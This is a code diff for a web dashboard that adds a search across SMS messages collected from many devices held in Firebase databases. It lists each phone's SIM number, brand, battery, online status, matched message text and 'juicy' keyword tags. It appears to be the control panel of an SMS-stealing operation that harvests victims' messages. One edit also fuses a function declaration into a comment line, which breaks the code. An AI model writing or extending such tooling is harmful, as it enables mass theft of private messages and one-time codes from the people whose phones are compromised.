@@ -326,12 +326,34 @@
         <div class="hc-title">On Alert Devices</div>
         <div class="hc-sub" id="alert-devices-home-sub">Loading…</div>
       </div>
+      <div class="home-card" onclick="openFindAllView()">
+        <div class="hc-icon">🔍</div>
+        <div class="hc-title">Find All</div>
+        <div class="hc-sub">Search all devices<br>across all URL sets</div>
+      </div>
     </div>
   </div>
 
+  <!-- ── FindAll view ── -->
+  <div id="view-findall" style="display:none;padding:0">
+    <div class="back-btn" onclick="showHome()" style="padding:16px 20px 8px">← Back to Home</div>
+    <div style="padding:0 20px 14px">
+      <h2 style="font-size:16px;margin-bottom:10px">🔍 Find All Devices</h2>
+      <div style="display:flex;gap:8px;align-items:center">
+        <input id="findall-input" type="text" placeholder="Enter keyword, SIM, brand or device ID…"
+               style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:8px;color:var(--text);padding:9px 14px;font-size:14px;outline:none"
+               onkeydown="if(event.key==='Enter')runFindAll(1)"
+               oninput="if(this.value.length===0)resetFindAll()">
+        <button class="btn" onclick="runFindAll(1)" id="findall-btn">Search</button>
+      </div>
+      <div id="findall-status" style="font-size:12px;color:var(--muted);margin-top:6px"></div>
+    </div>
+    <div id="findall-results" style="padding:0 20px"></div>
+    <div id="findall-pagination" style="padding:10px 20px 20px;display:flex;gap:8px;flex-wrap:wrap;align-items:center"></div>
+  </div>
+
   <!-- ── URL list view ── -->
-  <div id="view-urls" class="active">
-    <div class="stats-bar" id="stats-bar"></div>
+  <div id="view-urls" class="active">    <div class="stats-bar" id="stats-bar"></div>
     <div class="device-filters" id="sort-bar"></div>
     <div class="url-grid" id="url-grid">
       <div class="loading"><div class="spinner"></div><br>Loading…</div>
@@ -490,6 +512,7 @@ function showHome() {
   document.getElementById('view-urls').classList.remove('active');
   document.getElementById('view-devices').classList.remove('active');
   document.getElementById('view-alert-devices').style.display = 'none';
+  document.getElementById('view-findall').style.display = 'none';
   document.getElementById('mode-toggle').style.display = 'none';
   document.getElementById('total-badge').textContent = '—';
   // Refresh alert devices count on home
@@ -1858,8 +1881,108 @@ function _showAlertLoadError() {
   setTimeout(() => el.remove(), 8000);
 }
 
-// ── On Alert Devices view ─────────────────────────────────────────────────────
-async function openAlertDevicesView() {
+// ── FindAll view ─────────────────────────────────────────────────────────────
+let _findallCurrentPage = 1;
+let _findallCurrentQ    = '';
+
+function openFindAllView() {
+  document.getElementById('view-home').classList.remove('active');
+  document.getElementById('view-urls').classList.remove('active');
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-alert-devices').style.display = 'none';
+  document.getElementById('view-findall').style.display = 'block';
+  document.getElementById('mode-toggle').style.display = 'none';
+  document.getElementById('total-badge').textContent = '—';
+  // Focus the input
+  setTimeout(() => document.getElementById('findall-input')?.focus(), 100);
+}
+
+function resetFindAll() {
+  document.getElementById('findall-results').innerHTML = '';
+  document.getElementById('findall-pagination').innerHTML = '';
+  document.getElementById('findall-status').textContent = '';
+  document.getElementById('total-badge').textContent = '—';
+}
+
+async function runFindAll(page) {
+  const q = document.getElementById('findall-input').value.trim();
+  if (!q) return;
+  _findallCurrentQ    = q;
+  _findallCurrentPage = page;
+
+  const btn     = document.getElementById('findall-btn');
+  const status  = document.getElementById('findall-status');
+  const results = document.getElementById('findall-results');
+  const pagDiv  = document.getElementById('findall-pagination');
+
+  btn.disabled = true; btn.textContent = '⏳';
+  status.textContent = `Searching SMS across all URLs for "${q}"… (this may take a moment)`;
+  results.innerHTML = '<div class="loading"><div class="spinner"></div></div>';
+  pagDiv.innerHTML = '';
+
+  try {
+    const res  = await fetch(`/api/findall?q=${encodeURIComponent(q)}&page=${page}&limit=50`);
+    const data = await res.json();
+
+    btn.disabled = false; btn.textContent = 'Search';
+
+    if (data.error) { status.textContent = `Error: ${data.error}`; results.innerHTML = ''; return; }
+
+    document.getElementById('total-badge').textContent = `${data.total} found`;
+    status.textContent = data.total > 0
+      ? `Found ${data.total} device(s) across ${data.candidates} candidates — page ${data.page} of ${data.totalPages}`
+      : `No devices found with SMS containing "${q}"`;
+
+    if (!data.results.length) { results.innerHTML = ''; return; }
+
+    const esc      = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    const setLabel = s => s === 'pp' ? '🔵 PP' : s === 'old' ? '📦 Old' : '🆕 New';
+    const isToday  = ts => { if (!ts) return false; try { return (Date.now()-new Date(ts).getTime()) < 86400000; } catch { return false; } };
+
+    results.innerHTML = data.results.map(d => `
+      <div class="url-card" style="cursor:default;margin-bottom:8px">
+        <div class="url-card-header">
+          <span class="url-id" style="font-size:13px">#${d.urlId}</span>
+          <span class="url-host" style="font-size:11px">${d.url.replace('https://','').replace('-default-rtdb.firebaseio.com','')}</span>
+          <span class="badge-sm badge-blue" style="font-size:10px;margin-left:4px">${setLabel(d.urlSet)}</span>
+          <span class="badge-sm ${d.status==='online'?'badge-green':'badge-red'}" style="font-size:10px;margin-left:auto">${d.status}</span>
+        </div>
+        <div style="font-size:12px;margin:4px 0;display:flex;align-items:center;gap:6px">
+          ${isToday(d.lastActivity) ? '<span title="Active today">🔥</span>' : ''}
+          <code style="color:var(--text);font-size:11px" onclick="navigator.clipboard&&navigator.clipboard.writeText('${d.deviceId}')" title="Click to copy" style="cursor:pointer">${esc(d.deviceId)}</code>
+        </div>
+        <div class="url-metrics" style="margin-bottom:8px">
+          <div class="metric"><div class="k">Brand</div><div class="v" style="font-size:12px">${esc(d.brand)}</div></div>
+          <div class="metric"><div class="k">Battery</div><div class="v" style="font-size:12px">${esc(d.battery)}</div></div>
+          <div class="metric"><div class="k">SIM1</div><div class="v" style="font-size:12px">${esc(d.sim1)}</div></div>
+          <div class="metric"><div class="k">Last Activity</div><div class="v" style="font-size:11px">${d.lastActivity||'—'}</div></div>
+        </div>
+        ${d.matchBody ? `<div style="font-size:11px;color:var(--muted);background:var(--bg3);border-radius:6px;padding:6px 10px;margin-bottom:8px;word-break:break-word">
+          …${esc(d.matchBody).replace(new RegExp('('+q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','gi'),'<mark style="background:rgba(245,158,11,.35);color:var(--yellow);padding:0 2px;border-radius:2px">$1</mark>')}…
+        </div>` : ''}
+        ${d.juicyKeywords.length ? `<div>${d.juicyKeywords.map(k=>`<span class="kw-tag">${esc(k)}</span>`).join('')}</div>` : ''}
+        <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
+          <a class="sms-btn" href="${esc(d.smsLink)}" target="_blank">📥 SMS</a>
+          <button class="sms-btn" onclick="switchMode('${d.urlSet}');openUrl(${d.urlId})">👁️ View URL</button>
+        </div>
+      </div>`).join('');
+
+    // Pagination
+    if (data.totalPages > 1) {
+      let pag = '';
+      if (page > 1) pag += `<button class="btn btn-ghost" style="padding:4px 10px;font-size:12px" onclick="runFindAll(${page-1})">← Prev</button>`;
+      pag += `<span style="color:var(--muted);font-size:12px;padding:0 8px">Page ${page} / ${data.totalPages}</span>`;
+      if (page < data.totalPages) pag += `<button class="btn btn-ghost" style="padding:4px 10px;font-size:12px" onclick="runFindAll(${page+1})">Next →</button>`;
+      pagDiv.innerHTML = pag;
+    }
+  } catch (e) {
+    btn.disabled = false; btn.textContent = 'Search';
+    status.textContent = `Error: ${e.message}`;
+    results.innerHTML = '';
+  }
+}
+
+// ── On Alert Devices view ─────────────────────────────────────────────────────async function openAlertDevicesView() {
   document.getElementById('view-home').classList.remove('active');
   document.getElementById('view-urls').classList.remove('active');
   document.getElementById('view-devices').classList.remove('active');
